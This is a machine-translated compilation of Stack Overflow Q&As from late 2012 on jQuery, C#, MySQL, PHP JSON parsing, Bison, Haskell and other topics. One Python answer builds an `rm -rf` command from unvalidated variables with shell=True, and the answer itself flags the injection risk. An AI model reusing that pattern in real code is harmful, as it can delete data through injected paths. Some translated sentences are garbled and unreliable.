例如。第一个输入 = A，第二个输入 = B，现在结果：div#1 显示 AB 和 div#2 显示 B，结果应该是：div#1 显示 A 和 div#2 显示 B

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:24:07.677

如果您只需要显示插入的值，请使用[html()](http://api.jquery.com/html/) 而不是[append() ......](http://api.jquery.com/append/)

[html()](http://api.jquery.com/html/)用于设置元素的内容，该元素中的任何内容都会被新内容完全替换

[append()](http://api.jquery.com/append/)将参数指定的内容插入到匹配元素集中每个元素的末尾。

```
....
$.post(url,function(){
   $(".insertedText").html(textInserted);   //here
}); 
```

    …… 

**更新**

```
var i=1;
$(document).ready(function(){     
$("#addCase").submit(function(event) {
event.preventDefault(); 
//adding div
var idName ="Div_num_"+i;   
    $('.newValue').show(); 
    $('<div />').attr({
      'id' : idName       
      }).appendTo('#container').load("content.php", function() {   
          $('<h3>'+idName+'</h3>').prependTo($(this));    
        }); 

//showing input
  var $form = $("#addCase"),
  url = $form.attr("action"),      
  textInserted=$("#name").val();    
  $.post(url,function(){
    $("#"+ idName).find(".insertedText").html(textInserted);   //updated here 
  });
  $("#inputText").remove();
  i++;  //increment to the end
});   
}); 
```

# c# - 从字符串中分离字符

> ID：14097673
> 
> 赞同：-1
> 
> 时间：2012-12-31T05:10:44.870
> 
> 标签：c#, .net, string, character

所以我今天有一个名为“ *nick* _george_ *james* ”的字符串，它看起来像这样

```
string today = "_nick__george__james_"; 
```

如何将“_”之间的文本隔离为新字符串？我想把 3 个名字分成单独的字符串，这样最后我就有了 name1、name2、name3 的值 nick、george 和 james

我的应用程序是用 c# 编写的

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-31T05:11:47.793

使用[string.Split](http://msdn.microsoft.com/en-us/library/system.string.split.aspx)

```
string[] array = today.Split('_'); 
```

编辑您的问题后，我意识到`_`您的字符串中有多个。您应该尝试以下方法。

```
string[] array = today.Split("_".ToCharArray(), StringSplitOptions.RemoveEmptyEntries); 
```

或者

```
string[] array = today.Split(new []{"_"}, StringSplitOptions.RemoveEmptyEntries); 
```

稍后您`array`将包含：

```
array[0] = "nick";
array[1] = "george";
array[2] = "james"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T05:14:49.693

```
string[] array = today.Split('_');
name1=array[0];
name2=array[1];
name3=array[2]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T05:21:03.933

```
string[] nameArray = today.Split('_'); 
```

在这里，您将获得一组名称。您可以通过指定 nameArray 的索引位置来获取每个名称。

即现在nameArray包含的值如下

nameArray[0] = "nick", nameArray[1] = "george", nameArray[2] = "james"

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-31T07:38:13.213

***想出一个除 string.Split 之外的想法。***

```
string today = "_nick__george__james_";

//Change value nNoofwordstobeFound  accordingly

int nNoofwordstobeFound = 3;
int nstartindex = 0;
int nEndindex = 0;
int i=1;
while (i <= nNoofwordstobeFound)
{
    Skip:
    nstartindex = today.IndexOf("_",nEndindex);
    nEndindex = today.IndexOf("_", nstartindex + 1);

    string sName = today.Substring(nstartindex + 1, nEndindex - (nstartindex + 1));
    if (sName == "")
    {
        goto Skip;
    }
    else
    {
        //Do your code
        //For example                 
        string abc=  sName;    
    }

    i++;
} 
```

我仍然更喜欢 string.split 方法而不是任何时候。

# ruby - heroku commands broken after installation of Mountain Lion

> ID：14097680
> 
> 赞同：0
> 
> 时间：2012-12-31T05:11:52.140
> 
> 标签：ruby

I tried to run a heroku console for a Rails 3.2 app using

```
heroku run bundle exec rails console 
```

a command which has previously worked. It gave me the error message below. I also tried to run

```
heroku info 
```

and got a similar error message. I did this both before and after signing in with the heroku toolbelt, same result. I also tried this on another website and got the same result. Both websites are actually working, just can't access the console

Can anyone explain what the problem might be.

! Heroku client internal error.

```
Error:       No such file or directory -  git --version  (Errno::ENOENT)
Backtrace:   /usr/local/heroku/lib/heroku/helpers.rb:103:in ``'
             /usr/local/heroku/lib/heroku/helpers.rb:103:in `has_git?'
             /usr/local/heroku/lib/heroku/helpers.rb:108:in `git'
             /usr/local/heroku/lib/heroku/command/base.rb:206:in `git_remotes'
             /usr/local/heroku/lib/heroku/command/base.rb:179:in `extract_app_in_dir'
             /usr/local/heroku/lib/heroku/command/base.rb:31:in `app'
             /usr/local/heroku/lib/heroku/command/run.rb:108:in `block in run_attached'
             /usr/local/heroku/lib/heroku/helpers.rb:236:in `action'
             /usr/local/heroku/lib/heroku/command/run.rb:107:in `run_attached'
             /usr/local/heroku/lib/heroku/command/run.rb:21:in `index'
             /usr/local/heroku/lib/heroku/command.rb:206:in `run'
             /usr/local/heroku/lib/heroku/cli.rb:28:in `start'
             /usr/bin/heroku:24:in `<main>'

Command:     heroku run bundle exec rails console
Version:     heroku-toolbelt/2.33.2 (x86_64-darwin10.8.0) ruby/1.9.3 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T17:05:46.947

这个问题是由于在我的 Mac 上安装了 Mountain Lion 造成的。要修复它，我必须打开 XCode 首选项并在下载文件夹中安装命令行工具。

# xcode - Python C 扩展和 Xcode 4.5

> ID：14097685
> 
> 赞同：1
> 
> 时间：2012-12-31T05:12:15.747
> 
> 标签：xcode, python-c-extension

我想使用 XCode 4.5.2 创建一个 python C 扩展，以便我可以使用 xcode 调试器。扩展要求将 C 文件链接为 .so 文件。我无法在 xcode 中制作 .so 文件，只能制作 dylib 文件。

我尝试如下：1.使用C/C++库模板，指定动态库2.将Mach-O类型更改为Bundle 3.仍然无法制作.so所以我将包装器扩展名更改为.so，没有运气.

下面的帖子链接似乎说我可以手动更改扩展名。这对我不起作用，但我可能会犯另一个错误。

[如何让python在osx上加载dylib](https://stackoverflow.com/questions/2488016/how-to-make-python-load-dylib-on-osx)

对我的问题有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T22:43:21.793

`.so`文件在 Linux（和其他一些 Unix）上的用途与`.dylib`OS X 上的文件相同——它们是动态链接的库。如果其他一切都失败了，并且 Python 无法识别您的平台（以及在 OS X 上，它应该寻找`.dylib`文件的事实），请从`.dylib`具有相同名称但扩展名为`.so`.

（是的，这是一个非常丑陋的 hack，但它简单、直接并且有效。）

# mysql - COUNT(DISTINCT) 的百分位数与相关 WHERE 仅适用于视图（或没有 DISTINCT）

> ID：14097690
> 
> 赞同：0
> 
> 时间：2012-12-31T05:12:44.917
> 
> 标签：mysql, view, count, distinct, where-clause

我有一个奇怪的，我不知道这是我的语法（看起来很简单）还是一个错误（或者只是不受支持）。

这是我的查询有效但不必要的慢：

```
UPDATE table1 
    SET table1column1 = 
        (SELECT COUNT(DISTINCT table2column1) FROM table2view WHERE table2column1 <= (SELECT table2column1 FROM table2 WHERE table2.id = table1.id) )
        / 
        (SELECT COUNT(DISTINCT table2column1) FROM table2) 

       + (SELECT COUNT(DISTINCT table2column2) FROM table2view WHERE table2column2 <= (SELECT table2column2 FROM table2 WHERE table2.id = table1.id) ) 
        / 
        (SELECT COUNT(DISTINCT table2column2) FROM table2) 

       + (SELECT COUNT(DISTINCT table2column3) FROM table2view WHERE table2column3 <= (SELECT table2column3 FROM table2 WHERE table2.id = table1.id) ) 
        / (SELECT COUNT(DISTINCT table2column3) FROM table2); 
```

它只是删除重复项的三个百分位数（table2column1、table2column2 和 table2column3）的总和。

这就是它变得奇怪的地方。我必须为此使用一个视图来处理子查询，`WHERE`否则它只会`UPDATE`显示 的第一行`table1`，并将其余行设置`table1column1`为`0`。那`table2view`是`table2`. 是的，很奇怪。

如果我不使用`DISTINCT`，我可以在没有视图的情况下做到这一点。那有意义吗？ **注意：**我必须有，`DISTINCT`因为我有很多重复项。

我试着`SELECT`只从视图中制作它，但这减慢了它的速度。

有谁知道问题是什么以及返工这个查询的最佳方法，所以它不需要这么长时间？它在 a`TRIGGER`中，并且更新的数据非常按需。

提前谢谢了！

**细节**

我正在 phpMyAdmin 的命令行中测试速度。

我很确定降级来自视图，因为视图越多，我使用的实际表越少，它变得越慢。

当我做一个没有`DISTINCT`的时候，它的速度很快。

**仅适用于视图？**

好的，所以我只是设置了`table2`. 我首先尝试执行原始查询，用副本替换视图。不去。

我尝试使用副本而不是视图来执行以下查询。不去。

希望这些常量的引入能更好地展示我正在尝试做的事情。

```
SET @table2column1_distinct_count = (SELECT COUNT(DISTINCT table2column1) FROM table2);
SET @table2column2_distinct_count = (SELECT COUNT(DISTINCT table2column2) FROM table2);
SET @table2column3_distinct_count = (SELECT COUNT(DISTINCT table2column3) FROM table2);
UPDATE table1, table2
    SET table1.table1column1 = (SELECT COUNT(DISTINCT table2column1) FROM  table2view WHERE table2column1 <= table2.table2column1) / @table2column1_distinct_count 
    + (SELECT COUNT(DISTINCT table2column2) FROM  table2view WHERE table2column2 <= table2.table2column2) / @table2column2_distinct_count 
    + (SELECT COUNT(DISTINCT table2column3) FROM  table2view WHERE table2column3 <= table2.table2column3) / @table2column3_distinct_count 
        WHERE table1.id = table2.id; 
```

同样，当我使用`table2`而不是 时`table2view`，它只会正确更新第一行并设置所有其他行的 table1.table1column1 = `0`。

**数学**

我正在尝试将= 设置为、和by`table1.table1column1`的百分位数之和。`table2column1``table2column2``table2column3``id`

我通过（计算 a `table2columnX`<= 到 current的不同值）/（不同s`table2columnX`的总数）来做一个百分位数。`table2columnX`

我`DISTINCT`用来摆脱过多的重复。

**看法**

这是`SELECT`视图。这有帮助吗？

```
CREATE VIEW myTable.table2view AS SELECT
    table2.table2column1 AS table2column1,
    table2.table2column2 AS table2column2,
    table2.table2column2 AS table2column3,
FROM table2
GROUP BY table2.id; 
```

`GROUP BY`视图中是否有什么特别之处`SELECT`可以使这项工作（我没有看到）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T06:51:11.753

我可能会说查询很慢，因为它在触发器触发时重复访问表。

我不是 SQL 专家，但我尝试使用临时表来组合查询。您可以查看它是否有助于加快查询速度。我在下面的代码示例中使用了不同但相似的列名。

**编辑：**我之前的代码中有一个计算错误。现在更新了。

```
SELECT COUNT(id) INTO @no_of_attempts from tb2;

-- DROP TABLE IF EXISTS S1Percentiles;
-- DROP TABLE IF EXISTS S2Percentiles;
-- DROP TABLE IF EXISTS S3Percentiles;

CREATE TEMPORARY TABLE S1Percentiles (
    s1 FLOAT NOT NULL,
    percentile FLOAT NOT NULL DEFAULT 0.00
);

CREATE TEMPORARY TABLE S2Percentiles (
    s2 FLOAT NOT NULL,
    percentile FLOAT NOT NULL DEFAULT 0.00
);

CREATE TEMPORARY TABLE S3Percentiles (
    s3 FLOAT NOT NULL,
    percentile FLOAT NOT NULL DEFAULT 0.00
);

INSERT INTO S1Percentiles (s1, percentile)
    SELECT A.s1, ((COUNT(B.s1)/@no_of_attempts)*100)
    FROM (SELECT DISTINCT s1 from tb2) A
    INNER JOIN tb2 B
    ON B.s1 <= A.s1
    GROUP BY A.s1;

INSERT INTO S2Percentiles (s2, percentile)
    SELECT A.s2, ((COUNT(B.s2)/@no_of_attempts)*100)
    FROM (SELECT DISTINCT s2 from tb2) A
    INNER JOIN tb2 B
    ON B.s2 <= A.s2
    GROUP BY A.s2;

INSERT INTO S3Percentiles (s3, percentile)
    SELECT A.s3, ((COUNT(B.s3)/@no_of_attempts)*100)
    FROM (SELECT DISTINCT s3 from tb2) A
    INNER JOIN tb2 B
    ON B.s3 <= A.s3
    GROUP BY A.s3;

-- select * from S1Percentiles;
-- select * from S2Percentiles;
-- select * from S3Percentiles;

UPDATE tb1 A
    INNER JOIN
    (
    SELECT B.tb1_id AS id, (C.percentile + D.percentile + E.percentile) AS sum FROM tb2 B
        INNER JOIN S1Percentiles C
        ON B.s1 = C.s1
        INNER JOIN S2Percentiles D
        ON B.s2 = D.s2
        INNER JOIN S3Percentiles E
        ON B.s3 = E.s3
    ) F
    ON A.id = F.id

    SET A.sum = F.sum;

-- SELECT * FROM tb1;

DROP TABLE S1Percentiles;
DROP TABLE S2Percentiles;
DROP TABLE S3Percentiles; 
```

它的作用是记录每个分数组的百分位数，然后最后只`tb1`用必要的数据更新列，而不是重新计算每个学生行的百分位数。

您还应该索引列`s1`，`s2`并`s3`优化对这些列的查询。

注意：请根据您的数据库架构更新列名。另请注意，每个百分位数计算都已乘以，`100`因为我相信百分位数通常是这样计算的。

# python - 已传递 2 个参数时输入参数不足的错误

> ID：14097695
> 
> 赞同：0
> 
> 时间：2012-12-31T05:13:26.617
> 
> 标签：python

我收到以下错误，它说没有足够的参数，已经传递了两个参数......这里有什么问题？

```
 check_call("rm -rf %s/%s/*" % SCRIPT_ROOT % W_ROOT,shell=True)                                
    TypeError: not enough arguments for format string 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T05:17:18.877

您不能像这样分两步进行格式化。您需要使用一个`%`运算符并传递一个元组：

```
"rm -rf %s/%s/*" % (SCRIPT_ROOT, W_ROOT) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T05:20:28.843

`check_call('rm -rf {}/{}/*'.format(SCRIPT_ROOT,W_ROOT),shell=True)`

此外，请确保您了解 的含义`shell=True`，尤其是因为您似乎正在执行破坏性操作。

如果任何一个论点是 会发生`../../`什么？

# python - 在 wxpython 中创建弹出窗口

> ID：14097697
> 
> 赞同：0
> 
> 时间：2012-12-31T05:13:28.340
> 
> 标签：python, popup, wxpython, frames

```
#!/usr/bin/python

# myconfig.py

import wx

class MyFrame(wx.Frame):
    def __init__(self, parent, id, title):
        self.cfg = wx.Config('myconfig')
        if self.cfg.Exists('width'):
            w, h = self.cfg.ReadInt('width'), self.cfg.ReadInt('height')
        else:
            (w, h) = (250, 250)
        wx.Frame.__init__(self, parent, id, title, wx.DefaultPosition, wx.Size(w, h))

        wx.StaticText(self, -1, 'Width:', (20, 20))
        wx.StaticText(self, -1, 'Height:', (20, 70))
        self.sc1 = wx.SpinCtrl(self, -1, str(w), (80, 15), (60, -1), min=200, max=500)
        self.sc2 = wx.SpinCtrl(self, -1, str(h), (80, 65), (60, -1), min=200, max=500)
        wx.Button(self, 1, 'Save', (20, 120))

        self.Bind(wx.EVT_BUTTON, self.OnSave, id=1)
        self.statusbar = self.CreateStatusBar()
        self.Centre()

    def OnSave(self, event):
        self.cfg.WriteInt("width", self.sc1.GetValue())
        self.cfg.WriteInt("height", self.sc2.GetValue())
        self.statusbar.SetStatusText('Configuration saved, %s ' % wx.Now())

class MyApp(wx.App):
    def OnInit(self):
        frame = MyFrame(None, -1, 'myconfig.py')
        frame.Show(True)
        self.SetTopWindow(frame)
        return True

app = MyApp(0)
app.MainLoop() 
```

如果用户点击超过最大值或最小值，如何弹出一个窗口？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T05:58:45.150

您可以使用功能`wx.MessageDialog`，`wx.MessageBox`或更多改进或`wx.lib.agw.genericmessagedialog.GenericMessageDialog`。

# bison - 如何让 Bison 插入令牌？

> ID：14097700
> 
> 赞同：0
> 
> 时间：2012-12-31T05:13:51.920
> 
> 标签：bison

我正在尝试实现一个简单的基础，但恐怕 Bison 的操作对我来说并不清楚。为了实现“while”循环，我发现的示例使用以下结构（或类似结构）：

*while '(' 表达式 ')' 语句 { $$ = opr(WHILE, 2, $3, $5); }*

但实际上有两个隐藏的跳跃我应该分配令牌。我的意思如下：

```
while                             // no token assigned
( expression )                    // take appropriate sequence of tokens
jump back if not met              // insert a conditional jump token - a jump to expression checking
statement                         // take appropriate sequence of tokens
jump unconditionally              // insert a token to jump to expression checking 
```

但是表达式长度和语句长度都不知道，我可以记录输入'while'关键字的地址，这样就可以计算出最后的跳转。但是什么会促使 Bison 插入条件跳转令牌呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:26:31.773

目前尚不清楚您到底要做什么，但是 while 语句通常被“编译”成类似的东西

```
loop:
.. evaluate condition ..
JUMPC out
.. body ..
JUMP loop
out: 
```

我通常对我写的解释器做的是有一个阶段来解决解析后的所有标签，以便在解析语法树时只发出跳转和带有虚拟名称的标签，然后可以计算每个标签的地址并调整所有其中，例如，您将拥有

```
510-580 .. evaluate condition ..
590 JUMPC 820
600-800 .. body ..
810 JUMP 510
820 
```

这可以通过使用简单`std::map`的存储所有标签来轻松完成，这样在生成解析树后，您只需浏览代码，计算标签的所有地址（从 AST 中消失），然后在跳转中插入正确的地址。

只是为了更清楚我通常做什么：

```
//parser.y

while_stat:
  KW_WHILE T_LPAREN exp T_RPAREN block { $$ = new ASTWhileStat($3, $5); }
;

//ASTWhileStat.h

class ASTWhileStat : public ASTNode
{
  ASTNode *m_condition;
  ASTNode *m_body;

public:
  ASTWhileStat(ASTNode *condition, ASTNode *body) {
    m_condition = condition;
    m_body = body;
  }

  ASTWhileStat(const ASTWhileStat &other) {
    m_condition = other.m_condition;
    m_body = other.m_body;
  }

  ASTWhileStat &operator= (const ASTWhileStat &other) {
    if (&other != this) {
      m_condition = other.m_condition;
      m_body = other.m_body;
    }

    return *this;
  }

  ASTWhileStat *clone() {
    return new ASTWhileStat(*this);
  }

  u8 type() {
    return 0;
  }

  void populateSymbolTable() {
    m_condition->populateSymbolTable();
    if (m_body)
      m_body->populateSymbolTable();
  }

  void generateASM()
  { 
    u32 sCounter = ASTNode::labelCounter;
    u32 eCounter = ++ASTNode::labelCounter;
    ++ASTNode::labelCounter;

    printf("while%u:\n", sCounter);
    m_condition->generateASM();
    printf("NOT\n");
    printf("JUMPC while%u\n", eCounter);
    m_body->generateASM();
    printf("JUMP while%u\n", sCounter);
    printf("while%u:\n", eCounter);

    ++labelCounter; 
  }
} 
```

现在，在我的例子中，我生成了一种低级语言的 ASM 文本输出，因为我有另一个解析器，它可以将这种 ASM 代码解析为二进制文件，但是你可以加入这两个步骤。ASM 解析器中发生的情况如下：

```
label:
  STRING T_COLON { ASSEMBLER->addLabelHere($1); }
; 
```

这样做：

```
void Assembler::addLabelHere(string str) {
  printf("[ASSEMBLER] Added label %s at %u\n",str.c_str(),curPos);
  labels[str] = curPos;
} 
```

这是因为汇编器知道汇编代码的内部状态，并且知道当前距离程序开头的偏移量。

在组装阶段结束时，所有标签都已解决：

```
bool Assembler::solveLables()
{
  map<string,u32>::iterator it, it2;

  for (it = jumps.begin(); it != jumps.end(); ++it)
  {
    it2 = labels.find((*it).first);

    if (it2 == labels.end())
    {
      printf("[ASSEMBLER] Unsolved label \"%s\"!\n", (*it).first.c_str());
      return false;
    }

    u32 address = (*it2).second;
    u32 pos = (*it).second;

    printf("[ASSEMBLER] Solved jump at %u with address %u\n",pos,address);

    memcpy(&code[pos], &address, sizeof(u32));
  }

  return true;
} 
```

正如你所看到的，我在组装 JUMP 调用时将跳转的地址粗暴地复制到我保留的一些字节中。

# node.js - AppFog 上的 Node.js TCP 套接字服务器

> ID：14097706
> 
> 赞同：1
> 
> 时间：2012-12-31T05:14:31.850
> 
> 标签：node.js, sockets, tcp, appfog

鉴于以下在 AppFog 上运行的简单 TCP 套接字服务器，它会回显客户端发送的任何内容。

```
var net = require('net');

var server = net.createServer(function (socket) {
  socket.write('Echo server\r\n');
  socket.pipe(socket);
});

var port = process.env.VCAP_APP_PORT || 80;
server.listen(port);
console.log('Server running at ' + port); 
```

我似乎根本无法连接到服务器。它在我的本地开发机器上运行良好。

AppFog 是否支持我正在尝试做的事情？我对 Node.js 比较陌生，所以我不能确定代码是否正确。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:26:31.080

最简洁的答案是不。长答案在另一个 StakOverflow 问题中：[Node.js TCP Socket Server on the Cloud [Heroku/AppFog]](https://stackoverflow.com/questions/13458943/node-js-tcp-socket-server-on-the-cloud-heroku-appfog/)

# javascript - 使用jquery填充表单填充多个下拉列表

> ID：14097707
> 
> 赞同：1
> 
> 时间：2012-12-31T05:14:35.527
> 
> 标签：javascript, jquery

![在此处输入图像描述](../Images/7c1325c8a89353b365ce0799aa524333.png)

```
 ![$.getJSON('admin/admin/update-data/action_page/MasterTransportBusRoutes/data_id/' + dataId, function(data) {
                formPopulate("frm_add_update", data)
                //json_str = JSON.stringify(data);populateForm("frm_add_update", json_str)

                $.each(data.ddl_msbr_id, function (index, value) {
                alert(value.route_suburb_ids);
        });
            })][2] 
```

我正在使用此代码使用 jquery formPopulate 填写表单。除了多选下拉菜单外，它的工作正常。您能帮我解决如何在某些编辑时显示选择的多个选项。

```
JSON data:{"hid_id":"5","ddl_mtb_id":"3","txt_route_name":"Pramod Master Test","ddl_msbr_id":[{"route_suburb_ids":"1"},{"route_suburb_ids":"3"}]} 
```

# php - 我将如何使用 PHP 和 MySQL 抓取这些 JSON 信息？

> ID：14097711
> 
> 赞同：1
> 
> 时间：2012-12-31T05:14:59.683
> 
> 标签：php, json, scrape

这是我试图分解成数据库的信息。我将仅将其用于我自己的用途来分析统计数据等。我一直在使用 Excel 手动执行此操作，但我想在将来为自己节省一些工作。

网址是：http: [//fantasy.premierleague.com/web/api/elements/537/](http://fantasy.premierleague.com/web/api/elements/537/)

知道如何抓取该信息或轻松将其转换为 excel 格式吗？我知道一点 php 和 mysql，但对 JSON 一无所知，对抓取也知之甚少（我尝试弄乱 SIMPLE_HTML_DOM）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T05:18:31.860

您需要在 PHP 中对数据进行 JSON_decode。

```
$obj = JSON_decode($mydata));
print_r($obj); 
```

为您提供的额外信息：http: [//php.net/manual/en/function.json-decode.php](http://php.net/manual/en/function.json-decode.php)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-31T05:21:01.573

您可以将其转换为数组

```
 $array = json_decode(file_get_contents('http://fantasy.premierleague.com/web/api/elements/537/')); 
```

[json_decode()](http://php.net/manual/en/function.json-decode.php)

您可以使用[PEAR excel writer](http://pear.php.net/package/Spreadsheet_Excel_Writer/docs)将其转换为 excel

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-31T05:22:39.143

PHP 有一个 json 解析器函数 json_decode()。

所以：

1.  使用 file_get_contents() 函数将 json 内容从 URL 读取到字符串中。

2.  使用 json_decode() 创建 PHP 结构表示。

3.  使用 PEAR Spreadsheet_Excel_Writer 模块创建您的 Excel 电子表格。

是的。像 1、2、3 一样简单。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-31T05:18:12.420

使用 just`json_decode`并获取转换后的数据，如此编辑

```
$arr = json_decode('your JSON data',true);

echo $arr['transfers_out'];  // output 490374  //for array
echo $arr->transfers_out;  // output 490374  //for stdClass 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-31T05:23:57.103

PHP 让它变得非常简单：

```
$str = file_get_contents('http://fantasy.premierleague.com/web/api/elements/537/');
$jsonarray = json_decode($str, true);
var_dump($jsonarray); 
```

当然，您必须分析数组的结构并弄清楚如何将其分解为您真正要查找的内容。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-31T05:24:29.227

通过在 PHP 中提到的 URL 上运行 curl，在收到响应字符串后尝试使用 $obj = json_decode($jsonStr)。然后你可以从 json 对象中获取参数，比如

$obj['paramName'];

然后，您可以对信息做任何您想做的事情，包括将其放入数据库。

对于 php 中的简单 MySQL 交互，请查看 MySQLConnector 类。

[http://jakesankey.com/blog/2011/12/php-mysql-helper-class/](http://jakesankey.com/blog/2011/12/php-mysql-helper-class/)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-12-31T05:18:30.450

```
<?php

$x=json_decode(file_get_contents('http://fantasy.premierleague.com/web/api/elements/537/'));
print_r($x);//$x will contain all the values in an array format.

?> 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-12-31T05:22:27.123

```
<?php
// Create a stream
$opts = array(
  'http'=>array(
    'method'=>"GET"
  )
);

$context = stream_context_create($opts);

// Open the file using the HTTP headers set above
$json= file_get_contents('http://fantasy.premierleague.com/web/api/elements/537/', false, $context);
$arr= json_decode($json);

$xml = new SimpleXMLElement('<root/>');
array_walk_recursive($arr, array ($xml, 'addChild'));
print $xml->asXML(); 
```

# c - 无法在android中使用C计算大型bmp文件的大小

> ID：14097712
> 
> 赞同：-1
> 
> 时间：2012-12-31T05:15:43.437
> 
> 标签：c, file-io, android-ndk

我正在尝试使用 android ndk 中的 C 函数计算大型 bmp 文件的大小。我正在使用以下代码：-

```
int getSizeOfCapturedImage(char * imagePath) {
    FILE *imageFile = fopen(imagePath, "rb");
    long sizeOfImageFile = 0;

    if (imageFile == NULL) {
        printf("file not found!\n"); //handle error
        return 1;
    } else {
        fseek(imageFile, 0, SEEK_END);
        sizeOfImageFile = ftell(imageFile);
        printf("size of ImageFile is %1dB\n", sizeOfImageFile);
        fclose(imageFile);
    }
    return sizeOfImageFile;
} 
```

但是，当 bmp 文件的大小大于 120 字节时，此功能无法正常工作。该文件以某种方式无法打开，并且文件指针 *imageFile 变为 NULL。

谁能告诉我为什么会这样和/或有另一种出路？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:41:03.793

查看[此 SO post](https://stackoverflow.com/a/8384/1782481)，其中有一种解决方法，不需要您使用 fopen 打开文件。使用的代码是：

```
#include <sys/stat.h>

ssize_t fsize(const char *filename) {
    struct stat st; 

    if (stat(filename, &st) == 0)
        return st.st_size;

    return -1; 
} 
```

@H2CO3 的好点子：

> 数据类型：ssize_t 此数据类型用于表示在单个操作中可以读取或写入的块的大小。它类似于 size_t，但必须是有符号类型。

# delphi - 如何处理编译器警告“IncludeTrailingBackslash 特定于平台”？

> ID：14097717
> 
> 赞同：5
> 
> 时间：2012-12-31T05:16:57.693
> 
> 标签：delphi, delphi-xe2

编译我的应用程序时，有一个编译器警告：

> [DCC 警告] ... W1002 符号“IncludeTrailingBackslash”特定于平台

如何避免此警告？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-31T05:16:57.693

Delphi XE2 有另一个功能`IncludeTrailingPathDelimiter`可以用来代替`IncludeTrailingBackslash`. Delphi 支持的任何平台都支持此功能。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-31T09:11:25.857

为*避免*警告，请在配置对话框中将其关闭。这也会关闭所有其他特定于平台的警告，这可能会有所帮助，因为我认为您无论如何都不会开发 Linux 应用程序。

要*绕过*警告，`IncludeTrailingPathDelimiter`请按照您的建议使用另一个函数 ( )。

# haskell - 从类型写一个满足类型的函数

> ID：14097718
> 
> 赞同：1
> 
> 时间：2012-12-31T05:16:58.270
> 
> 标签：haskell, types, functional-programming, ml

这个问题取自考试。我不知道该怎么做。:-(

问题：举一个 haskell 或 ml 函数的例子，它的类型是

**( a -> b ) -> ( c -> a ) -> c -> b**

怎么做？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-31T05:27:57.380

什么有意义的功能可以有类型`mystery :: ( a -> b ) -> ( c -> a ) -> c -> b`？

看看能有什么

```
mystery f g x 
```

是？

它需要处理三件事，

*   一个`x`类型的值`c`，
*   `g`一种类型的函数`c -> a`和
*   `f`type 的一种功能`a -> b`。

它应该产生一个类型的值`b`。

唯一与函数有关的参数`b`是函数`f`，因此结果必须是`f ???`。

这里的论点是`f`什么？它必须具有 type ，并且从给定参数（忽略底部，，， ）`a`产生该类型值的唯一方法是应用于某些东西，所以它必须是`undefined``error "foo"``g`

```
mystery f g x = f (g ??) 
```

但是可以`g`应用于什么？那必须是 type 的值`c`。除了底部之外，唯一`c`可以从参数构造的类型值是`x`，所以

```
mystery f g x = f (g x) 
```

*必须*是函数组合（或未定义）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-31T20:05:17.940

到目前为止，其他答案实际上并未显示一般执行此操作的逻辑过程。我也不会 100% 详细地展示它，但我会举一个例子。

对此的“深层”技巧是找到给定类型的函数等同于证明逻辑定理。使用[Lemmon 系统 L](http://en.wikipedia.org/wiki/System_L_%28Lemmon%29)的一种形式（在一些初级逻辑课程中使用的一种更友好的[自然演绎](http://en.wikipedia.org/wiki/Natural_deduction)形式），您的示例将如下所示：

```
Theorem:  ??? :: (a -> b) -> (c -> a) -> c -> b

1\.                 f :: a -> b  (aux. assumption)
2\.                 g :: c -> a  (aux. assumption)
3\.                 x :: c       (aux. assumption)
4\.               g x :: a       (2, 3, -> elim; assumes 2, 3)
5\.           f (g x) :: b       (1, 4, -> elim; assumes 1, 2, 3)
6\.     \x -> f (g x) :: c -> b  (3, 4, -> intro; discharges 3, assumes 1, 2)

7\.   \g x -> f (g x) :: (c -> a) -> c -> b
                        (2, 6, -> intro; discharges 2, assumes 1)

8\. \f g x -> f (g x) :: (a -> b) -> (c -> a) -> c -> b  
                        (1, 7, -> intro; discharges 1) 
```

这里的想法是[函数式编程语言和逻辑之间存在紧密的对应关系](http://en.wikipedia.org/wiki/Curry-Howard_correspondence)，例如：

1.  类型对应于逻辑命题
2.  函数定义对应逻辑证明
3.  逻辑证明规则对应于如何构造编程语言表达式的规则。

因此，“辅助假设”逻辑证明规则（步骤 1-3）对应于引入一个新的自由变量。隐含消除规则（步骤 4-5，又名“作案方式”）对应于函数应用。蕴涵引入规则（步骤 6-8，又名“假设推理”）对应于 lambda 抽象。解除辅助假设的概念对应于绑定自由变量。没有前提的证明的概念对应于没有自由变量的表达式的概念。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-31T05:21:53.043

该函数是函数组合运算符，通过在 Hoogle 中键入函数的类型，您可以找到：[http ://www.haskell.org/hoogle/?hoogle=%28+a+-%3E+b+%29+- %3E+%28+c+-%3E+a+%29+-%3E+c+-%3E+b++](http://www.haskell.org/hoogle/?hoogle=%28+a+-%3E+b+%29+-%3E+%28+c+-%3E+a+%29+-%3E+c+-%3E+b++)

然后您可以单击以显示源：

```
(.)    :: (b -> c) -> (a -> b) -> a -> c
(.) f g = \x -> f (g x) 
```

# php - 带有 PHP 的 MySQL 数组

